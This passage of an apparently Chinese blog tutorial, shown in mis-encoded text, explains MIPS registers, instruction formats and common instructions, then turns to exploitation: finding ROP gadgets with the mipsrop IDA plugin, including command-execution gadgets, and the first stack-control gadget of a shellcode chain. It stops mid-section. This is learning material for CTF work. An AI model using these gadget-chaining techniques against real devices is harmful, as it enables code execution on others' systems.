<figure class="highlight mipsasm"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">move </span>$<span class="built_in">t0</span>,$<span class="built_in">t1</span></span><br><span class="line"><span class="comment">#å®é™…ä¸º  </span></span><br><span class="line"><span class="keyword">add </span>$<span class="built_in">t0</span>,$<span class="number">0</span>,$<span class="built_in">t1</span></span><br></pre></td></tr></table></div></figure>

<p>ä½¿ç”¨ä¼ªæŒ‡ä»¤å¯ä»¥ç®€åŒ–ä»»åŠ¡ï¼Œæ±‡ç¼–ç¨‹åºæä¾›äº†æ¯”ç¡¬ä»¶æ›´ä¸°å¯Œçš„æŒ‡ä»¤é›†ã€‚</p>
<ul>
<li>$1</li>
</ul>
<p>å³ $atï¼Œè¯¥å¯„å­˜å™¨ä¸ºæ±‡ç¼–ä¿ç•™ï¼Œç”±äºIå‹æŒ‡ä»¤çš„ç«‹å³æ•°å­—æ®µåªæœ‰16ä½ï¼Œåœ¨åŠ è½½å¤§å¸¸æ•°æ—¶ï¼Œç¼–è¯‘å™¨æˆ–æ±‡ç¼–ç¨‹åºéœ€è¦æŠŠå¤§å¸¸æ•°æ‹†å¼€ï¼Œç„¶åé‡æ–°ç»„åˆåˆ°å¯„å­˜å™¨é‡Œã€‚æ¯”å¦‚åŠ è½½ä¸€ä¸ª32ä½ç«‹å³æ•°éœ€è¦ <code>lui</code>ï¼ˆè£…å…¥é«˜ä½ç«‹å³æ•°ï¼‰å’Œ<code>addi</code>ä¸¤æ¡æŒ‡ä»¤ã€‚åƒMIPSç¨‹åºæ‹†æ•£å’Œé‡è£…å¤§å¸¸æ•°ç”±æ±‡ç¼–ç¨‹åºæ¥å®Œæˆï¼Œæ±‡ç¼–ç¨‹åºå¿…éœ€ä¸€ä¸ªä¸´æ—¶å¯„å­˜å™¨æ¥é‡ç»„å¤§å¸¸æ•°ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºæ±‡ç¼–ä¿ç•™$atçš„åŸå› ä¹‹ä¸€ã€‚</p>
<ul>
<li>$2..$3:($v0-$v1)</li>
</ul>
<p>ç”¨äºå­ç¨‹åºçš„éæµ®ç‚¹ç»“æœæˆ–è¿”å›å€¼ï¼Œå¯¹äºå­ç¨‹åºå¦‚ä½•ä¼ é€’å‚æ•°åŠå¦‚ä½•è¿”å›ï¼ŒMIPSèŒƒå›´æœ‰ä¸€å¥—çº¦å®šï¼Œå †æ ˆä¸­å°‘æ•°å‡ ä¸ªä½ç½®å¤„çš„å†…å®¹è£…å…¥CPUå¯„å­˜å™¨ï¼Œå…¶ç›¸åº”å†…å­˜ä½ç½®ä¿ç•™æœªåšå®šä¹‰ï¼Œå½“è¿™ä¸¤ä¸ªå¯„å­˜å™¨ä¸å¤Ÿå­˜æ”¾è¿”å›å€¼æ—¶ï¼Œç¼–è¯‘å™¨é€šè¿‡å†…å­˜æ¥å®Œæˆã€‚</p>
<ul>
<li>$4..$7:($a0-$a3)</li>
</ul>
<p>ç”¨æ¥ä¼ é€’å‰å››ä¸ªå‚æ•°ç»™å­ç¨‹åºï¼Œä¸å¤Ÿçš„ç”¨å †æ ˆã€‚a0-a3å’Œv0-v1ä»¥åŠraä¸€èµ·æ¥æ”¯æŒå­ç¨‹åºï¼è¿‡ç¨‹è°ƒç”¨ï¼Œåˆ†åˆ«ç”¨ä»¥ä¼ é€’å‚æ•°ï¼Œè¿”å›ç»“æœå’Œå­˜æ”¾è¿”å›åœ°å€ã€‚å½“éœ€è¦ä½¿ç”¨æ›´å¤šçš„å¯„å­˜å™¨æ—¶ï¼Œå°±éœ€è¦å †æ ˆï¼ˆstack)äº†,MIPSç¼–è¯‘å™¨æ€»æ˜¯ä¸ºå‚æ•°åœ¨å †æ ˆä¸­ç•™æœ‰ç©ºé—´ä»¥é˜²æœ‰å‚æ•°éœ€è¦å­˜å‚¨ã€‚</p>
<ul>
<li>$8..$15:($t0-$t7)</li>
</ul>
<p>ä¸´æ—¶å¯„å­˜å™¨ï¼Œå­ç¨‹åºå¯ä»¥ä½¿ç”¨å®ƒä»¬è€Œä¸ç”¨ä¿ç•™ã€‚</p>
<ul>
<li>$16..$23:($s0-$s7)</li>
</ul>
<p>ä¿å­˜å¯„å­˜å™¨ï¼Œåœ¨è¿‡ç¨‹è°ƒç”¨è¿‡ç¨‹ä¸­éœ€è¦ä¿ç•™ï¼ˆè¢«è°ƒç”¨è€…ä¿å­˜å’Œæ¢å¤ï¼Œè¿˜åŒ…æ‹¬$fpå’Œ$raï¼‰ï¼ŒMIPSæä¾›äº†ä¸´æ—¶å¯„å­˜å™¨å’Œä¿å­˜å¯„å­˜å™¨ï¼Œè¿™æ ·å°±å‡å°‘äº†å¯„å­˜å™¨æº¢å‡ºï¼ˆspilling,å³å°†ä¸å¸¸ç”¨çš„å˜é‡æ”¾åˆ°å­˜å‚¨å™¨çš„è¿‡ç¨‹),ç¼–è¯‘å™¨åœ¨ç¼–è¯‘ä¸€ä¸ªå¶ï¼ˆleaf)è¿‡ç¨‹ï¼ˆä¸è°ƒç”¨å…¶å®ƒè¿‡ç¨‹çš„è¿‡ç¨‹ï¼‰çš„æ—¶å€™ï¼Œæ€»æ˜¯åœ¨ä¸´æ—¶å¯„å­˜å™¨åˆ†é…å®Œäº†æ‰ä½¿ç”¨éœ€è¦ä¿å­˜çš„å¯„å­˜å™¨ã€‚</p>
<ul>
<li>$24..$25:($t8-$t9)</li>
</ul>
<p>åŒ($t0-$t7) $26..$27:($k0,$k1)ä¸ºæ“ä½œç³»ç»Ÿï¼å¼‚å¸¸å¤„ç†ä¿ç•™ï¼Œè‡³å°‘è¦é¢„ç•™ä¸€ä¸ªã€‚ å¼‚å¸¸ï¼ˆæˆ–ä¸­æ–­ï¼‰æ˜¯ä¸€ç§ä¸éœ€è¦åœ¨ç¨‹åºä¸­æ˜¾ç¤ºè°ƒç”¨çš„è¿‡ç¨‹ã€‚MIPSæœ‰ä¸ªå«å¼‚å¸¸ç¨‹åºè®¡æ•°å™¨ï¼ˆexception program counter,EPC)çš„å¯„å­˜å™¨ï¼Œå±äºCP0å¯„å­˜å™¨ï¼Œç”¨äºä¿å­˜é€ æˆå¼‚å¸¸çš„é‚£æ¡æŒ‡ä»¤çš„åœ°å€ã€‚æŸ¥çœ‹æ§åˆ¶å¯„å­˜å™¨çš„å”¯ä¸€æ–¹æ³•æ˜¯æŠŠå®ƒå¤åˆ¶åˆ°é€šç”¨å¯„å­˜å™¨é‡Œï¼ŒæŒ‡ä»¤<code>mfc0</code>(move from system control)å¯ä»¥å°†EPCä¸­çš„åœ°å€å¤åˆ¶åˆ°æŸä¸ªé€šç”¨å¯„å­˜å™¨ä¸­ï¼Œé€šè¿‡è·³è½¬è¯­å¥ï¼ˆ<code>jr</code>)ï¼Œç¨‹åºå¯ä»¥è¿”å›åˆ°é€ æˆå¼‚å¸¸çš„é‚£æ¡æŒ‡ä»¤å¤„ç»§ç»­æ‰§è¡Œã€‚MIPSç¨‹åºå‘˜éƒ½å¿…é¡»ä¿ç•™ä¸¤ä¸ªå¯„å­˜å™¨$k0å’Œ$k1ï¼Œä¾›æ“ä½œç³»ç»Ÿä½¿ç”¨ã€‚<br>å‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œè¿™ä¸¤ä¸ªå¯„å­˜å™¨çš„å€¼ä¸ä¼šè¢«æ¢å¤ï¼Œç¼–è¯‘å™¨ä¹Ÿä¸ä½¿ç”¨k0å’Œk1,å¼‚å¸¸å¤„ç†å‡½æ•°å¯ä»¥å°†è¿”å›åœ°å€æ”¾åˆ°è¿™ä¸¤ä¸ªä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œç„¶åä½¿ç”¨jrè·³è½¬åˆ°é€ æˆå¼‚å¸¸çš„æŒ‡ä»¤å¤„ç»§ç»­æ‰§è¡Œã€‚</p>
<ul>
<li>$28:($gp)</li>
</ul>
<p>ä¸ºäº†ç®€åŒ–é™æ€æ•°æ®çš„è®¿é—®ï¼ŒMIPSè½¯ä»¶ä¿ç•™äº†ä¸€ä¸ªå¯„å­˜å™¨ï¼šå…¨å±€æŒ‡é’ˆgp(global pointer,$gp)ï¼Œå…¨å±€æŒ‡é’ˆæŒ‡å‘é™æ€æ•°æ®åŒºä¸­çš„è¿è¡Œæ—¶å†³å®šçš„åœ°å€ï¼Œåœ¨å­˜å–ä½äºgpå€¼ä¸Šä¸‹32KBèŒƒå›´å†…çš„æ•°æ®æ—¶ï¼Œåªéœ€è¦ä¸€æ¡ä»¥gpä¸ºåŸºæŒ‡é’ˆçš„æŒ‡ä»¤å³å¯ã€‚åœ¨ç¼–è¯‘æ—¶ï¼Œæ•°æ®é¡»åœ¨ä»¥gpä¸ºåŸºæŒ‡é’ˆçš„64KBèŒƒå›´å†…ã€‚</p>
<ul>
<li>$29:($sp)</li>
</ul>
<p>MIPSç¡¬ä»¶å¹¶ä¸ç›´æ¥æ”¯æŒå †æ ˆï¼Œä½ å¯ä»¥æŠŠå®ƒç”¨äºåˆ«çš„ç›®çš„ï¼Œä½†ä¸ºäº†ä½¿ç”¨åˆ«äººçš„ç¨‹åºæˆ–è®©åˆ«äººä½¿ç”¨ä½ çš„ç¨‹åºï¼Œè¿˜æ˜¯è¦éµå®ˆè¿™ä¸ªçº¦å®šçš„ï¼Œä½†è¿™å’Œç¡¬ä»¶æ²¡æœ‰å…³ç³»ã€‚</p>
<ul>
<li>$30:($fp)</li>
</ul>
<p>GNU MIPS Cç¼–è¯‘å™¨ä½¿ç”¨äº†å¸§æŒ‡é’ˆ(frame pointer),è€ŒSGIçš„Cç¼–è¯‘å™¨æ²¡æœ‰ä½¿ç”¨ï¼Œè€ŒæŠŠè¿™ä¸ªå¯„å­˜å™¨å½“ä½œä¿å­˜å¯„å­˜å™¨ä½¿ç”¨ï¼ˆ$s8),è¿™èŠ‚çœäº†è°ƒç”¨å’Œè¿”å›å¼€é”€ï¼Œä½†å¢åŠ äº†ä»£ç ç”Ÿæˆçš„å¤æ‚æ€§ã€‚</p>
<ul>
<li>$31:($ra)</li>
</ul>
<p>å­˜æ”¾è¿”å›åœ°å€ï¼ŒMIPSæœ‰ä¸ª<code>jal</code>(jump-and-link,è·³è½¬å¹¶ é“¾æ¥)æŒ‡ä»¤ï¼Œåœ¨è·³è½¬åˆ°æŸä¸ªåœ°å€æ—¶ï¼ŒæŠŠä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€æ”¾åˆ°$raä¸­ã€‚ç”¨äºæ”¯æŒå­ç¨‹åºï¼Œä¾‹å¦‚è°ƒç”¨ç¨‹åºæŠŠå‚æ•°æ”¾åˆ°$a0~$a3,ç„¶å<code>jal X</code>è·³åˆ°Xè¿‡ç¨‹ï¼Œè¢«è°ƒè¿‡ç¨‹å®ŒæˆåæŠŠç»“æœæ”¾åˆ°$v0,$v1,ç„¶åä½¿ç”¨<code>jr $ra</code>è¿”å›ã€‚</p>

        <h2 id="4-æŒ‡ä»¤"   >
          <a href="#4-æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-æŒ‡ä»¤" class="headerlink" title="4.æŒ‡ä»¤"></a>4.æŒ‡ä»¤</h2>
      
        <h3 id="1-ä¸åŒç±»å‹çš„æŒ‡ä»¤"   >
          <a href="#1-ä¸åŒç±»å‹çš„æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä¸åŒç±»å‹çš„æŒ‡ä»¤" class="headerlink" title="(1)ä¸åŒç±»å‹çš„æŒ‡ä»¤"></a>(1)ä¸åŒç±»å‹çš„æŒ‡ä»¤</h3>
      
        <h4 id="Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨"   >
          <a href="#Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨" class="headerlink" title="Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨"></a>Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨</h4>
      <p>å¸¸è§æŒ‡ä»¤ï¼š<code>add</code>, <code>sub</code>, <code>and</code>, <code>or</code>, <code>nor</code>, <code>slt</code>, <code>sll</code>, <code>srl</code>, <code>jr</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150231733.png" alt="image-20211230150231733"></p>
<ul>
<li>opcodï¼šæ“ä½œç  </li>
<li>rsï¼šæºå¯„å­˜å™¨çš„æ•°é‡ </li>
<li>rtï¼šæºå¯„å­˜å™¨çš„æ•°é‡ </li>
<li>rdï¼šç›®æ ‡å¯„å­˜å™¨çš„ç¼–å·</li>
<li>shamï¼šç§»ä½é‡ï¼ˆæ“ä½œç§»ä½çš„ä½æ•°ï¼‰</li>
<li>Func: å‡½æ•°ï¼ˆæ“ä½œç æ‰©å±•ï¼‰ </li>
</ul>
<p>Shamä»…ç”¨äºæ“ä½œåç§»é‡çš„æŒ‡ä»¤ï¼ˆä¾‹å¦‚<code>stl</code>ï¼‰</p>

        <h4 id="Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡"   >
          <a href="#Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡" class="heading-link"><i class="fas fa-link"></i></a><a href="#Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡" class="headerlink" title="Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡"></a>Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡</h4>
      <p>å¸¸è§æŒ‡ä»¤ï¼š<code>addi</code>, <code>lw</code>, <code>sw</code>, <code>lh</code>, <code>sh</code>, <code>lb</code>, <code>lbu</code>, <code>sb</code>, <code>ll</code>, <code>sc</code>, <code>lui</code>, <code>andi</code>, <code>ori</code>, <code>beq</code>, <code>bne</code>, <code>slti</code>, <code>sltiu</code></p>
<p><img   src="https://dev.azure.com/zslyvain/9285f0e6-8055-4a5c-aec3-50d9555ac078/_apis/git/repositories/4eb461c6-bb1f-489f-978b-686e8c32decf/items?path=/1625856577691_8905.png&versionDescriptor%5BversionOptions%5D=0&versionDescriptor%5BversionType%5D=0&versionDescriptor%5Bversion%5D=master&resolveLfs=true&$format=octetStream&api-version=5.0" style=""  alt="img"></p>
<ul>
<li>opcodï¼šæ“ä½œç </li>
<li>rsï¼šæºå¯„å­˜å™¨çš„æ•°é‡</li>
<li>rdï¼šæºæˆ–ç›®æ ‡å¯„å­˜å™¨çš„æ•°é‡</li>
<li>imd: ç«‹å³å€¼</li>
</ul>

        <h4 id="Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€"   >
          <a href="#Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€" class="headerlink" title="Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€"></a>Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€</h4>
      <p>å¤„ç†å™¨ç›´æ¥è·³è·ƒåˆ°ç»™å®šçš„åœ°å€ï¼Œæ‰§è¡Œæ‰€åœ¨åœ°å€çš„æŒ‡ä»¤</p>
<p>å¸¸è§æŒ‡ä»¤ï¼š<code>j</code>, <code>jal</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150255746.png" alt="image-20211230150255746"></p>
<ul>
<li>Opcodï¼šæ“ä½œç </li>
<li>Imdï¼šç«‹å³å€¼</li>
</ul>

        <h3 id="2-å¸¸ç”¨æŒ‡ä»¤"   >
          <a href="#2-å¸¸ç”¨æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="(2)å¸¸ç”¨æŒ‡ä»¤"></a>(2)å¸¸ç”¨æŒ‡ä»¤</h3>
      <p>å…¶ä¸­<code>i</code>è¡¨ç¤ºç«‹å³æ•°ç›¸å…³ï¼Œ<code>u</code>è¡¨ç¤ºæ— ç¬¦å·ç›¸å…³ã€‚</p>

        <h4 id="â‘ load-store-æŒ‡ä»¤"   >
          <a href="#â‘ load-store-æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ load-store-æŒ‡ä»¤" class="headerlink" title="â‘ load/store æŒ‡ä»¤"></a>â‘ load/store æŒ‡ä»¤</h4>
      <ul>
<li><p>laï¼šå°†åœ°å€æˆ–è€…æ ‡ç­¾å­˜å…¥ä¸€ä¸ªå¯„å­˜å™¨ eg:<code>la $t0,val_1</code>å¤åˆ¶val_lçš„åœ°å€åˆ°$t0ä¸­ï¼Œval_1æ˜¯ä¸€ä¸ªLabel</p>
</li>
<li><p>liï¼šå°†ç«‹å³æ•°å­˜å…¥é€šç”¨å¯„å­˜å™¨ eg:<code>li $t1, 40</code> $t1 = 40</p>
</li>
<li><p>lwï¼šä»æŒ‡å®šçš„åœ°å€åŠ è½½ä¸€ä¸ªwordç±»å‹çš„å€¼åˆ°ä¸€ä¸ªå¯„å­˜å™¨ eg:<code>lw $s0, 0($sp) $s0=MEM[$sp+0]</code></p>
</li>
<li><p>swï¼šå°†å¯„å­˜å™¨çš„å€¼ï¼Œå­˜äºæŒ‡å®šçš„åœ°å€wordç±»å‹ eg:<code>sw $a0, 0($sp) MEM[$sp+0] = $a0</code></p>
</li>
<li><p>moveï¼šå¯„å­˜å™¨ä¼ å€¼ egï¼š<code>move $t5, $t2 $t5 = $t2</code></p>
</li>
</ul>

        <h4 id="â‘¡ç®—æ•°æŒ‡ä»¤"   >
          <a href="#â‘¡ç®—æ•°æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡ç®—æ•°æŒ‡ä»¤" class="headerlink" title="â‘¡ç®—æ•°æŒ‡ä»¤"></a>â‘¡ç®—æ•°æŒ‡ä»¤</h4>
      <p>ç®—æ•°æŒ‡ä»¤çš„æ‰€æœ‰æ“ä½œéƒ½æ˜¯å¯„å­˜å™¨ï¼Œä¸èƒ½æ˜¯ RAM åœ°å€æˆ–é—´æ¥å¯»å€ã€‚ä¸”æ“ä½œæ•°å¤§å°éƒ½æ˜¯ wordï¼ˆ4byteï¼‰</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add $t0, $t1, $t2;		$t0=$t1+$t2;	å¸¦ç¬¦å·æ•°ç›¸åŠ </span><br><span class="line">sub $t0, $t1, $t2;		$t0=$t1-$t2;	å¸¦ç¬¦å·æ•°ç›¸å‡</span><br><span class="line">addi $t0, $t1, 5;		$t0=$t1+5;		æœ‰ç«‹å³æ•°çš„åŠ æ³•</span><br><span class="line">addu $t0, $t1, $t2;		$t0=$t1+$t2;	æ— ç¬¦å·æ•°çš„åŠ æ³•</span><br><span class="line">subu $t0, $t1, $t2;		$t0=$t1-$t2;	å¸¦ç¬¦å·æ•°ç›¸å‡</span><br><span class="line">mult $t3, $t3;			(HI, LO) = $t3 * $t4</span><br><span class="line">div $t5, $t6;			$Hi=$t5 mod $t6</span><br><span class="line">mfhi $t0;				$t0 = $Hi</span><br><span class="line">mflo $t1;				$t1 = $Lo</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¢syscall"   >
          <a href="#â‘¢syscall" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢syscall" class="headerlink" title="â‘¢syscall"></a>â‘¢syscall</h4>
      <p>äº§ç”Ÿä¸€ä¸ªè½¯åŒ–ä¸­æ–­ï¼Œå®ç°ç³»ç»Ÿè°ƒç”¨ï¼›ç³»ç»Ÿè°ƒç”¨å·å­˜æ”¾åœ¨ $v0 ä¸­ï¼Œå‚æ•°åœ¨ $a0~$a3 ä¸­ï¼›</p>
<p>è¿”å›å€¼åœ¨ $v0 ä¸­ï¼Œå¦‚æœå‡ºé”™ï¼Œåœ¨ $a3 ä¸­è¿”å›é”™è¯¯å·ï¼›åœ¨ç¼–å†™ shellcode æ—¶ï¼Œç”¨åˆ°è¯¥æŒ‡ä»¤æœºåˆ¶</p>
<p>Write(1, â€œABCnâ€, 5) å®ç°å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">addiu $sp, $sp, -32;</span><br><span class="line">li $a0, 1;</span><br><span class="line">lui $t6, 0x4142;</span><br><span class="line">ori $t6, $t6, 0x430a;</span><br><span class="line">sw  $t6, $0($sp);</span><br><span class="line">addiu $a1, $sp, 0;</span><br><span class="line">li $a2, 5;</span><br><span class="line">li $v0, 4004;</span><br><span class="line">syscall;</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤"   >
          <a href="#â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤" class="headerlink" title="â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤"></a>â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤</h4>
      <p>åˆ†æ”¯è·³è½¬æŒ‡ä»¤æœ¬èº«å¯ä»¥é€šè¿‡æ¯”è¾ƒä¸¤ä¸ªå¯„å­˜å™¨å†³å®šå¦‚ä½•è·³è½¬ï¼›å¦‚æœæƒ³è¦å®ç°ä¸ç«‹å³æ•°çš„æ¯”è¾ƒè·³è½¬ï¼Œéœ€è¦ç»“åˆç±»è·³è½¬æŒ‡ä»¤å®ç°</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b target;				æ— æ¡ä»¶è·³è½¬åˆ°targetå¤„</span><br><span class="line">beq $t0, $t1, target;	å¦‚æœ&quot;$t0 == $t1â€ï¼Œè·³è½¬åˆ°target</span><br><span class="line">blt $t0, $t1, target;	å¦‚æœâ€œ$t0 &lt; $t1â€ï¼Œè·³è½¬åˆ°target</span><br><span class="line">ble $t0, $t1, target;	å¦‚æœâ€œ$t0 &lt;= $t1â€ è·³è½¬åˆ°target</span><br><span class="line">bgt;</span><br><span class="line">blt;</span><br><span class="line">bne;					ç±»æ¯”ä¸Š</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¤è·³è½¬æŒ‡ä»¤"   >
          <a href="#â‘¤è·³è½¬æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¤è·³è½¬æŒ‡ä»¤" class="headerlink" title="â‘¤è·³è½¬æŒ‡ä»¤"></a>â‘¤è·³è½¬æŒ‡ä»¤</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">j target;			æ— æ¡ä»¶è·³è½¬target</span><br><span class="line">jr $t3;				è·³è½¬åˆ°$t3æŒ‡å‘çš„åœ°å€å¤„(Jump Register),æ²¡æœ‰ä¿å­˜åœ°å€,ä¸€èˆ¬æ˜¯å‡½æ•°è¿”å›æ—¶å€™ç”¨åˆ°çš„</span><br><span class="line">jal target;			è·³è½¬åˆ°targetï¼Œå¹¶ä¿å­˜è¿”å›åœ°å€åˆ°$raä¸­ï¼Œå¸¸è§äºå‡½æ•°è°ƒç”¨</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¥å­å‡½æ•°çš„è°ƒç”¨"   >
          <a href="#â‘¥å­å‡½æ•°çš„è°ƒç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¥å­å‡½æ•°çš„è°ƒç”¨" class="headerlink" title="â‘¥å­å‡½æ•°çš„è°ƒç”¨"></a>â‘¥å­å‡½æ•°çš„è°ƒç”¨</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jal   sub_routine_label;å¤åˆ¶è¿”å›åœ°å€åˆ°$raä¸­,å³å½“å‰PC+8çš„å€¼ï¼Œç¨‹åºè·³è½¬åˆ°sub_routine_label</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¦å­å‡½æ•°çš„è¿”å›"   >
          <a href="#â‘¦å­å‡½æ•°çš„è¿”å›" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¦å­å‡½æ•°çš„è¿”å›" class="headerlink" title="â‘¦å­å‡½æ•°çš„è¿”å›"></a>â‘¦å­å‡½æ•°çš„è¿”å›</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jr    $ra;å¦‚æœå­å‡½æ•°é‡å¤åµŒå¥—ï¼Œåˆ™å°†$raçš„å€¼ä¿å­˜åœ¨å †æ ˆä¸­ï¼Œå› ä¸º$raæ€»æ˜¯ä¿å­˜å½“å‰æ‰§è¡Œçš„å­å‡½æ•°çš„è¿”å›åœ°å€</span><br></pre></td></tr></table></div></figure>



<p>ä»¥ä¸Šå¤§å¤šå‚è€ƒå¦‚ä¸‹</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://valeeraz.github.io/2020/05/08/architecture-mips/" >MIPSæ±‡ç¼–è¯­è¨€å…¥é—¨ - Sylvainâ€™s Blog (valeeraz.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259594" >2021ç¬¬å››å±Šå¼ºç½‘æ‹Ÿæ€é˜²å¾¡ç§¯åˆ†èµ›å·¥æ§pwn eserver WP - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="5-å¸¸ç”¨ROPå¯»å€"   >
          <a href="#5-å¸¸ç”¨ROPå¯»å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-å¸¸ç”¨ROPå¯»å€" class="headerlink" title="5.å¸¸ç”¨ROPå¯»å€"></a>5.å¸¸ç”¨ROPå¯»å€</h2>
      <p>IDAä¸­</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mipsrop</span></span><br><span class="line"><span class="keyword">import</span> mipsrop</span><br><span class="line">mipsrop=mipsrop.MIPSROPFinder()</span><br><span class="line">mipsrop.find(<span class="string">&quot;&quot;</span>)</span><br><span class="line">mipsrop.stackfinder() <span class="comment">#å¯»æ‰¾æ ˆæ•°æ®å¯æ§çš„ ropï¼Œå»ºç«‹å’Œ a0ã€a1 å¯„å­˜å™¨çš„å…³ç³»</span></span><br><span class="line">mipsrop.summary() <span class="comment">#åˆ—å‡ºæ‰€æœ‰çš„å¯ç”¨ rop</span></span><br><span class="line">mipsrop.system() <span class="comment">#å¯»æ‰¾å‘½ä»¤æ‰§è¡Œçš„çš„rop</span></span><br><span class="line">mipsrop.find(<span class="string">&#x27;jr $ra&#x27;</span>)</span><br><span class="line">mipsrop.find(<span class="string">&quot;move $t9, $s3&quot;</span>)</span><br><span class="line">mipsrop.find(<span class="string">&quot;addiu $a1,$sp&quot;</span>)</span><br></pre></td></tr></table></div></figure>

<p>å¾ˆå¤šå¥½ç”¨ROPçš„å¯åœ¨libcçš„scandir_tailç±»åˆ«å‡½æ•°ä¸‹å¯ä»¥æ‰¾åˆ°</p>

        <h3 id="Shellcodeä¸‰éƒ¨æ›²"   >
          <a href="#Shellcodeä¸‰éƒ¨æ›²" class="heading-link"><i class="fas fa-link"></i></a><a href="#Shellcodeä¸‰éƒ¨æ›²" class="headerlink" title="Shellcodeä¸‰éƒ¨æ›²"></a><code>Shellcode</code>ä¸‰éƒ¨æ›²</h3>
      
        <h4 id="1-gadget1"   >
          <a href="#1-gadget1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-gadget1" class="headerlink" title="(1)gadget1"></a>(1)gadget1</h4>
      <p>ä»spæ§åˆ¶å¯„å­˜å™¨</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lw ra,0x3c(sp);</span><br><span class="line">lw s3,0x2c(sp);</span><br><span class="line">lw s2,0x28(sp);</span><br><span class="line">lw s1,0x24(sp);</span><br><span class="line">lw s0,0x20(sp);</span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªé€šå¸¸å¯ä»¥åœ¨<code>scandir_tail</code>å‡½æ•°ä¸­æ‰¾ï¼Œæˆ–è€…å¦‚ä¸‹</p>
